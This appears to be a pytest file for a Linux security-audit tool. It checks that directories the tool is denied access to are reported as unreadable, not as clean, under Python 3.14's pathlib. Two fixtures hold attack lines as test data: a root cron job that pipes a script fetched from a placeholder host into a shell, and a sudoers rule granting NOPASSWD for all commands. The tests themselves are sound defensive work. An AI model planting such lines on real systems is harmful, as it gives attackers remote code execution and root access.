"""Python 3.14 turned "not allowed to look" into "not there".

Up to 3.13, ``Path.is_file()``, ``is_dir()``, ``exists()`` and ``is_symlink()``
re-raised a ``PermissionError``; from 3.14 they answer ``False``. Measured on
3.14.7 against a file inside a mode-000 directory — ``is_file`` False, ``stat``
still raising. The CI's 3.14 job failed on one test of v0.18.0's profile lookup;
the same reliance on the raise sat in three more places where it changed
the answer.

These tests do not depend on the interpreter running them. The
``python314_predicates`` fixture gives ``pathlib`` the 3.14 behaviour on any
version, so the guards bite on the 3.12 the mutation bench runs on — a guard
that only fails on the one interpreter where the defect lives would pass the
bench while guarding nothing.
"""

from __future__ import annotations

import logging
import os
import pathlib

import pytest

from bob._fs import strict_is_file, strict_is_symlink

pytestmark = pytest.mark.skipif(
    os.geteuid() == 0, reason="root bypasses the mode-000 directory these need"
)


@pytest.fixture
def python314_predicates(monkeypatch):
    """Make pathlib's predicates swallow every OSError, as 3.14 does."""
    for name in ("is_file", "is_dir", "exists", "is_symlink"):
        original = getattr(pathlib.Path, name)

        def swallowing(self, *args, _original=original, **kwargs):
            try:
                return _original(self, *args, **kwargs)
            except OSError:
                return False

        monkeypatch.setattr(pathlib.Path, name, swallowing)


@pytest.fixture
def shut(tmp_path):
    """A directory holding a regular file and a symlink, then closed."""
    d = tmp_path / "shut"
    d.mkdir()
    (d / "inside.conf").write_text("x", encoding="utf-8")
    (d / "link").symlink_to(d / "inside.conf")
    d.chmod(0o000)
    yield d
    d.chmod(0o755)


# ---------------------------------------------------------------------------
# The helpers keep the ≤3.13 contract, under 3.14's pathlib
# ---------------------------------------------------------------------------

def test_the_fixture_really_reproduces_314(shut, python314_predicates):
    """The mirror: without this, every test below could pass vacuously."""
    assert (shut / "inside.conf").is_file() is False


@pytest.mark.parametrize("helper,name", [
    (strict_is_file, "inside.conf"),
    (strict_is_symlink, "link"),
])
def test_a_denial_still_raises(helper, name, shut, python314_predicates):
    with pytest.raises(PermissionError):
        helper(shut / name)


def test_an_absence_is_still_false(tmp_path, python314_predicates):
    (tmp_path / "a-file").write_text("x", encoding="utf-8")
    for helper in (strict_is_file, strict_is_symlink):
        assert helper(tmp_path / "nothing-here") is False
        assert helper(tmp_path / "a-file" / "under-a-file") is False  # ENOTDIR


def test_the_answers_are_right_where_bob_may_look(tmp_path):
    f = tmp_path / "f"
    f.write_text("x", encoding="utf-8")
    link = tmp_path / "l"
    link.symlink_to(f)
    assert strict_is_file(f) and not strict_is_symlink(f)
    assert not strict_is_file(tmp_path)
    assert strict_is_symlink(link) and strict_is_file(link)


# ---------------------------------------------------------------------------
# The four call sites, under 3.14's pathlib
# ---------------------------------------------------------------------------

def test_profile_in_a_shut_directory_is_not_reported_absent(
    shut, tmp_path, monkeypatch, python314_predicates
):
    """The one the CI's 3.14 job caught."""
    import bob.profiles as P

    builtin = tmp_path / "builtin"
    builtin.mkdir()
    monkeypatch.setattr(P, "_USER_PROFILES_DIR", shut)
    monkeypatch.setattr(P, "_BUILTIN_PROFILES_DIR", builtin)
    P.lookup_profile_file.cache_clear()
    try:
        lookup = P.lookup_profile_file("inside")
    finally:
        P.lookup_profile_file.cache_clear()
    assert lookup.path is None
    assert lookup.unreadable == (str(shut),)


def test_a_config_path_bob_cannot_inspect_is_not_safe(shut, python314_predicates):
    """``_is_safe_service_config``: "I could not tell" is not "safe"."""
    from bob.checks.services import _is_safe_service_config

    assert _is_safe_service_config(shut / "link", str(shut / "*")) is False


def test_logrotate_rules_it_could_not_inspect_are_not_a_count_of_zero(
    tmp_path, monkeypatch, python314_predicates
):
    """A directory that lists but will not let BOB stat its entries."""
    import bob.checks.log_rotation as L

    d = tmp_path / "logrotate.d"
    d.mkdir()
    (d / "rsyslog").write_text("x", encoding="utf-8")
    d.chmod(0o444)  # readable, not traversable: iterdir works, stat does not
    monkeypatch.setattr(L, "_LOGROTATE_D", d)
    try:
        count, readable = L._count_logrotate_rules()
    finally:
        d.chmod(0o755)
    assert (count, readable) == (0, False), (
        "BOB claimed to have read a directory whose entries it never inspected"
    )


def test_a_plugin_bob_cannot_stat_is_not_called_irregular(
    tmp_path, monkeypatch, caplog, python314_predicates
):
    from bob import plugin_checks

    d = tmp_path / "checks.d"
    d.mkdir()
    plugin = d / "mine.py"
    plugin.write_text("def run_check(ctx):\n    return None\n", encoding="utf-8")
    d.chmod(0o444)
    try:
        loader = plugin_checks._load_one
        with caplog.at_level(logging.WARNING):
            assert loader(plugin) is None
    finally:
        d.chmod(0o755)
    assert "not a regular file" not in caplog.text
    assert "cannot stat" in caplog.text


# ---------------------------------------------------------------------------
# v0.18.3 — more call sites where a denial must not read as "clean"
# ---------------------------------------------------------------------------

def test_sudoers_d_denied_is_not_read_as_no_rules(
    shut, tmp_path, monkeypatch, python314_predicates
):
    """A refused /etc/sudoers.d must mark the sudoers check incomplete, not
    conclude there are no drop-in NOPASSWD rules."""
    import bob.checks.file_perms as FP

    monkeypatch.setattr(FP, "_SUDOERS_D", shut / "sudoers.d")   # stat denied (parent 000)
    monkeypatch.setattr(FP, "_SUDOERS", tmp_path / "no-sudoers")
    all_, spec, readable = FP._collect_nopasswd_entries()
    assert readable is False, "a denied /etc/sudoers.d was read as 'no rules'"
    assert all_ == [] and spec == []


def test_sudoers_d_absent_is_readable_true(tmp_path, monkeypatch, python314_predicates):
    """Polarity: genuinely absent (not denied) is fine — readable stays True."""
    import bob.checks.file_perms as FP

    monkeypatch.setattr(FP, "_SUDOERS_D", tmp_path / "nope")
    monkeypatch.setattr(FP, "_SUDOERS", tmp_path / "no-sudoers")
    _all, _spec, readable = FP._collect_nopasswd_entries()
    assert readable is True


def test_sudoers_d_readable_finds_nopasswd_all(tmp_path, monkeypatch):
    """Polarity: a readable drop-in with NOPASSWD:ALL is still detected."""
    import bob.checks.file_perms as FP

    d = tmp_path / "sudoers.d"
    d.mkdir()
    (d / "danger").write_text("baduser ALL=(ALL) NOPASSWD: ALL\n", encoding="utf-8")
    monkeypatch.setattr(FP, "_SUDOERS_D", d)
    monkeypatch.setattr(FP, "_SUDOERS", tmp_path / "no-sudoers")
    all_, _spec, readable = FP._collect_nopasswd_entries()
    assert readable is True and any("NOPASSWD" in x.upper() for x in all_)


def test_etc_ssh_denied_marks_host_keys_unreadable(
    shut, monkeypatch, python314_predicates
):
    import bob.checks.file_perms as FP

    monkeypatch.setattr(FP, "_ETC_SSH", shut / "ssh")          # stat denied
    monkeypatch.setattr(FP, "_SUDOERS_D", shut.parent / "no-d")
    monkeypatch.setattr(FP, "_SUDOERS", shut.parent / "no-sudoers")
    snap = FP.FilePermsSnapshot.from_system()
    assert snap.ssh_host_keys_readable is False


def test_etc_ssh_readable_finds_a_bad_host_key(tmp_path, monkeypatch):
    """Polarity: a readable /etc/ssh with an over-permissioned host key is
    still flagged, and marked readable."""
    import bob.checks.file_perms as FP

    d = tmp_path / "ssh"
    d.mkdir()
    key = d / "ssh_host_rsa_key"
    key.write_text("x", encoding="utf-8")
    key.chmod(0o644)
    monkeypatch.setattr(FP, "_ETC_SSH", d)
    monkeypatch.setattr(FP, "_SUDOERS_D", tmp_path / "no-d")
    monkeypatch.setattr(FP, "_SUDOERS", tmp_path / "no-sudoers")
    snap = FP.FilePermsSnapshot.from_system()
    assert snap.ssh_host_keys_readable is True
    assert any("ssh_host_rsa_key" in p for p, _m in snap.ssh_host_key_issues)


def test_ssh_host_keys_unreadable_emits_a_note():
    from bob import i18n
    from bob.checks.file_perms import FilePermsSnapshot, check_file_perms

    i18n.init("en")
    result = check_file_perms(FilePermsSnapshot(ssh_host_keys_readable=False), t=i18n.t)
    assert "file_perms.ssh_host_keys_unreadable" in [f.key for f in result.findings]


def test_cron_d_denied_is_recorded_unreadable_not_empty(
    shut, tmp_path, monkeypatch, python314_predicates
):
    """A refused /etc/cron.d must land in unreadable_files (verdict withheld),
    not be scanned as empty — a pipe-to-shell cron inside would go unaudited."""
    import bob.checks.cron_audit as CA

    monkeypatch.setattr(CA, "_CRON_FORMAT_DIRS", [shut / "cron.d"])   # stat denied
    monkeypatch.setattr(CA, "_CRON_SCRIPT_DIRS", [])
    monkeypatch.setattr(CA, "_SYSTEM_CRONTABS", [])
    monkeypatch.setattr(CA, "_USER_CRONTAB_DIR", tmp_path / "nouser")
    snap = CA.CronAuditSnapshot.from_system()
    assert str(shut / "cron.d") in snap.unreadable_files


def test_cron_d_readable_finds_pipe_to_shell(tmp_path, monkeypatch):
    """Polarity: a readable cron.d is scanned and its pipe-to-shell caught."""
    import bob.checks.cron_audit as CA

    d = tmp_path / "cron.d"
    d.mkdir()
    (d / "job").write_text("* * * * * root curl http://x/s.sh | sh\n", encoding="utf-8")
    monkeypatch.setattr(CA, "_CRON_FORMAT_DIRS", [d])
    monkeypatch.setattr(CA, "_CRON_SCRIPT_DIRS", [])
    monkeypatch.setattr(CA, "_SYSTEM_CRONTABS", [])
    monkeypatch.setattr(CA, "_USER_CRONTAB_DIR", tmp_path / "nouser")
    snap = CA.CronAuditSnapshot.from_system()
    assert snap.pipe_to_shell_entries, "readable cron.d pipe-to-shell missed"
    assert str(d) not in snap.unreadable_files


def test_user_crontab_dir_denied_is_recorded_unreadable(
    shut, tmp_path, monkeypatch, python314_predicates
):
    import bob.checks.cron_audit as CA

    monkeypatch.setattr(CA, "_CRON_FORMAT_DIRS", [])
    monkeypatch.setattr(CA, "_CRON_SCRIPT_DIRS", [])
    monkeypatch.setattr(CA, "_SYSTEM_CRONTABS", [])
    monkeypatch.setattr(CA, "_USER_CRONTAB_DIR", shut / "crontabs")   # stat denied
    snap = CA.CronAuditSnapshot.from_system()
    assert str(shut / "crontabs") in snap.unreadable_files


def test_journal_dir_denied_is_not_read_as_volatile(
    shut, monkeypatch, python314_predicates
):
    """A refused /var/log/journal must leave persistence unknown, not False —
    False on a default (auto) host reads as 'volatile' and warns falsely."""
    import bob.checks.log_rotation as L

    monkeypatch.setattr(L, "_JOURNAL_DIR", shut / "journal")   # stat denied
    snap = L.LogRotationSnapshot.from_system()
    assert snap.journal_persistent is None


def test_journal_dir_absent_is_false_not_none(tmp_path, monkeypatch, python314_predicates):
    """Polarity: genuinely absent is False (a real 'auto → volatile' signal)."""
    import bob.checks.log_rotation as L

    monkeypatch.setattr(L, "_JOURNAL_DIR", tmp_path / "no-journal")
    snap = L.LogRotationSnapshot.from_system()
    assert snap.journal_persistent is False


def test_unknown_journal_persistence_is_a_note_not_a_volatile_warning():
    from bob import i18n
    from bob.checks.log_rotation import LogRotationSnapshot, check_log_rotation

    i18n.init("en")
    snap = LogRotationSnapshot(
        journald_active=True, journald_storage="", journal_persistent=None,
        logrotate_installed=True, logrotate_rule_count=1,
    )
    keys = [f.key for f in check_log_rotation(snap, i18n.t).findings]
    assert "log_rotation.journal_dir_unreadable" in keys
    assert "log_rotation.journald_volatile" not in keys


def test_absent_journal_dir_on_auto_still_warns_volatile():
    """Polarity: a real absence on default storage is still the volatile WARN."""
    from bob import i18n
    from bob.checks.log_rotation import LogRotationSnapshot, check_log_rotation

    i18n.init("en")
    snap = LogRotationSnapshot(
        journald_active=True, journald_storage="", journal_persistent=False,
        journald_conf_readable=True, logrotate_installed=True, logrotate_rule_count=1,
    )
    assert "log_rotation.journald_volatile" in [f.key for f in check_log_rotation(snap, i18n.t).findings]


# ---------------------------------------------------------------------------
# v0.18.3 batch 2 — backup: a denied config/keys dir is "installed", not "active"
# ---------------------------------------------------------------------------

def _only_on_path(*names):
    """A `_command_exists` stand-in: True for `names`, False for everything else."""
    wanted = set(names)
    return lambda cmd: cmd in wanted


def test_borg_keys_dir_denied_is_installed_not_active(shut, monkeypatch):
    """A refused /root/.config/borg/keys must leave borg "installed" (present,
    configuration unconfirmed) and must never crash from_system — up to 3.13
    the bare is_dir() raised here and the exception propagated out of a method
    that promises not to. No 3.14 fixture: the stat-based strict_ helpers raise
    on a real denied dir on every interpreter, so this exercises the real raise
    the try/except must absorb."""
    import bob.checks.backup as B

    monkeypatch.setattr(B, "_command_exists", _only_on_path("borg"))
    monkeypatch.setattr(B, "_BORG_KEYS_DIR", shut / "keys")   # stat denied (parent 000)
    snap = B.BackupSnapshot.from_system()   # must not raise
    assert "borg" in snap.installed_tools
    assert "borg" not in snap.active_tools


def test_borg_keys_dir_populated_is_active(tmp_path, monkeypatch):
    """Polarity: a readable, non-empty keys dir still means borg is active."""
    import bob.checks.backup as B

    keys = tmp_path / "keys"
    keys.mkdir()
    (keys / "repo").write_text("x", encoding="utf-8")
    monkeypatch.setattr(B, "_command_exists", _only_on_path("borg"))
    monkeypatch.setattr(B, "_BORG_KEYS_DIR", keys)
    snap = B.BackupSnapshot.from_system()
    assert "borg" in snap.active_tools


def test_borgmatic_config_denied_is_installed_not_active(shut, monkeypatch):
    """A borgmatic config path BOB may not read is "installed" (present,
    config unconfirmed), never a false "active"; from_system must not crash.
    (Real denied dir, no 3.14 fixture — see the borg test above.)"""
    import bob.checks.backup as B

    monkeypatch.setattr(B, "_command_exists", _only_on_path("borgmatic"))
    monkeypatch.setattr(B, "_BORGMATIC_CONFIGS", (shut / "config.yaml",))  # stat denied
    snap = B.BackupSnapshot.from_system()   # must not raise
    assert "borgmatic" in snap.installed_tools
    assert "borgmatic" not in snap.active_tools


def test_borgmatic_config_present_is_active(tmp_path, monkeypatch):
    """Polarity: a readable borgmatic config file still means active."""
    import bob.checks.backup as B

    cfg = tmp_path / "config.yaml"
    cfg.write_text("location:\n", encoding="utf-8")
    monkeypatch.setattr(B, "_command_exists", _only_on_path("borgmatic"))
    monkeypatch.setattr(B, "_BORGMATIC_CONFIGS", (cfg,))
    snap = B.BackupSnapshot.from_system()
    assert "borgmatic" in snap.active_tools


# ---------------------------------------------------------------------------
# v0.18.3 batch 3 — ssl_certs: a denied cert store is not "no certificates"
# ---------------------------------------------------------------------------

@pytest.fixture
def locked_store(tmp_path):
    """A non-empty cert store whose *parent* is traversable but whose own bits
    are cleared — the real /etc/ssl/private (0710 root) shape. stat() and
    is_dir() succeed here; only reading the directory is denied. That is the
    case Path.glob() silently swallows and iterdir() raises on."""
    parent = tmp_path / "etc-ssl"
    parent.mkdir()                       # 0755, traversable
    store = parent / "private"
    store.mkdir()
    (store / "server.pem").write_text("x", encoding="utf-8")
    store.chmod(0o000)                   # readable-parent, unreadable leaf
    yield store
    store.chmod(0o755)


def test_locked_cert_store_is_recorded_unreadable_not_absent(
    locked_store, tmp_path, monkeypatch
):
    """A 0700/0710 store BOB may list-deny (the ordinary no-sudo case) must be
    recorded unreadable, not scanned as empty via glob's swallowed error — an
    expiring cert inside would otherwise go unmeasured and its deduction unmade.
    No 3.14 fixture: stat succeeds (parent traversable) so the regression is not
    in is_dir() here; it is that glob() eats the read denial, which iterdir()
    surfaces on every interpreter."""
    import bob.checks.ssl_certs as S

    monkeypatch.setattr(S, "_command_exists", _only_on_path("openssl"))
    monkeypatch.setattr(S, "_SSL_PRIVATE", locked_store)
    monkeypatch.setattr(S, "_LE_LIVE", tmp_path / "none")   # genuinely absent
    snap = S.SslCertsSnapshot.from_system()
    assert str(locked_store) in snap.unreadable_dirs
    assert str(tmp_path / "none") not in snap.unreadable_dirs


def test_ssl_private_absent_is_not_unreadable(tmp_path, monkeypatch):
    """Polarity: a genuinely absent store leaves unreadable_dirs empty."""
    import bob.checks.ssl_certs as S

    monkeypatch.setattr(S, "_command_exists", _only_on_path("openssl"))
    monkeypatch.setattr(S, "_LE_LIVE", tmp_path / "no-le")
    monkeypatch.setattr(S, "_SSL_PRIVATE", tmp_path / "no-priv")
    snap = S.SslCertsSnapshot.from_system()
    assert snap.unreadable_dirs == []


def test_unreadable_cert_store_is_a_visibility_note():
    from bob import i18n
    from bob.checks.ssl_certs import SslCertsSnapshot, check_ssl_certs
    from bob.visibility import is_visibility_key

    i18n.init("en")
    snap = SslCertsSnapshot(unreadable_dirs=["/etc/letsencrypt/live"])
    keys = [f.key for f in check_ssl_certs(snap, i18n.t).findings]
    assert "ssl_certs.dir_unreadable" in keys
    assert is_visibility_key("ssl_certs.dir_unreadable")


# ---------------------------------------------------------------------------
# v0.18.3 batch 4 — file_integrity: a denied AIDE/Tripwire DB dir is not
# "database not initialised" (a WARN and a point on a possibly-covered host)
# ---------------------------------------------------------------------------

def test_aide_db_dir_denied_is_unknown_not_missing(locked_store, monkeypatch):
    """/var/lib/aide is root-owned; when it is not traversable, path_exists
    swallows the denial and reports the DB missing. strict_is_file raises, so a
    denied location is db_readable=False, not a false 'not initialised'."""
    import bob.checks.file_integrity as FI

    # A DB path *inside* the locked (mode-000) directory: stat is denied.
    monkeypatch.setattr(FI, "_AIDE_DB_PATHS", (locked_store / "aide.db",))
    exists, readable = FI._aide_db_state()
    assert (exists, readable) == (False, False)


def test_aide_db_present_is_found(tmp_path, monkeypatch):
    """Polarity: a readable, present DB file is found and readable."""
    import bob.checks.file_integrity as FI

    db = tmp_path / "aide.db"
    db.write_text("x", encoding="utf-8")
    monkeypatch.setattr(FI, "_AIDE_DB_PATHS", (db,))
    assert FI._aide_db_state() == (True, True)


def test_aide_db_genuinely_absent_is_a_real_no_db(tmp_path, monkeypatch):
    """Polarity: AIDE installed, DB never initialised (ENOENT) stays a true
    'no database' — readable True, so the WARN still fires."""
    import bob.checks.file_integrity as FI

    monkeypatch.setattr(FI, "_AIDE_DB_PATHS", (tmp_path / "never-made" / "aide.db",))
    assert FI._aide_db_state() == (False, True)


def test_tripwire_db_dir_denied_is_unknown_not_missing(locked_store, monkeypatch):
    """glob() would swallow the read denial and report the DB missing; iterdir()
    raises, so a locked /var/lib/tripwire is db_readable=False."""
    import bob.checks.file_integrity as FI

    monkeypatch.setattr(FI, "_TRIPWIRE_DB_DIR", locked_store)   # mode-000, readable parent
    exists, readable = FI._tripwire_db_state()
    assert (exists, readable) == (False, False)


def test_tripwire_db_present_is_found(tmp_path, monkeypatch):
    """Polarity: a readable dir holding a .twd is found."""
    import bob.checks.file_integrity as FI

    d = tmp_path / "tripwire"
    d.mkdir()
    (d / "host.twd").write_text("x", encoding="utf-8")
    monkeypatch.setattr(FI, "_TRIPWIRE_DB_DIR", d)
    assert FI._tripwire_db_state() == (True, True)


def test_denied_integrity_db_is_a_note_not_a_deduction():
    from bob import i18n
    from bob.checks.file_integrity import FileIntegritySnapshot, check_file_integrity
    from bob.visibility import is_visibility_key

    i18n.init("en")
    snap = FileIntegritySnapshot(tool="aide", db_exists=False, db_readable=False)
    result = check_file_integrity(snap, t=i18n.t)
    keys = [f.key for f in result.findings]
    assert "file_integrity.db_unknown" in keys
    assert "file_integrity.no_db" not in keys
    assert sum(d.points for d in result.deductions) == 0
    assert is_visibility_key("file_integrity.db_unknown")
